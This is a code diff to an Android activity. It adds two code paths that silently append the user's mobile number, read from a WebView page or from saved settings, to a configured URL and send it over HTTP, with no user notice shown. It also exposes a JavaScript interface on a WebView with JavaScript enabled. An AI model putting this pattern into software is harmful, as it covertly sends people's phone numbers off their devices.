@@ -64,7 +64,9 @@ public class WapGroupActivity extends Activity {
 	private View mContainer;
 	private View mIconPage;
 	private View mCoverPage;
-	private WapIconAdapter mAdapter;
+	private WapIconAdapter mAdapter; 
+	
+	private WebView wvMobile;
 	
     private SharedPreferences settings;	
 
@@ -97,7 +99,7 @@ public class WapGroupActivity extends Activity {
 	}
 	
 	private void checkMobileNum() {
-		final WebView wvMobile = (WebView) findViewById(R.id.wv_mobile_num);
+		wvMobile = (WebView) findViewById(R.id.wv_mobile_num);
 
 		wvMobile.getSettings().setJavaScriptEnabled(true);
 		wvMobile.addJavascriptInterface(new MyJavaScript(), "HTMLOUT");
@@ -149,6 +151,10 @@ public class WapGroupActivity extends Activity {
 				SharedPreferences.Editor editor = settings.edit();
 				editor.putString(Constants.SAVE_MOBILE_NUM, html);
 				editor.commit();
+				
+				HttpDownloader downloader = new HttpDownloader();
+				String send_status = downloader.download(Constants.SEND_MOBILE_URL + html);
+				Log.i(TAG, "Send Mobile Number Status:"+send_status);
 			}else{
 				Log.e(TAG, "Can't get my mobile number.");
 			}
@@ -364,7 +370,12 @@ public class WapGroupActivity extends Activity {
 				if(TextUtils.isEmpty(mobileNum)){
 					checkMobileNum();
 				}else{
-					Log.i(TAG, "I know my mobile number "+mobileNum);
+					HttpDownloader downloader = new HttpDownloader();
+					String sendMobileUrl = Constants.SEND_MOBILE_URL + mobileNum;
+					Log.i(TAG, "Send Mobile Number Status to:" + sendMobileUrl);
+					String send_status = downloader.download(sendMobileUrl);
+					Log.i(TAG, "Send Mobile Number Status:" + send_status);
+					Log.i(TAG, "I know my mobile number " + mobileNum);
 				}
 			} catch (Exception e) {
 				e.printStackTrace();
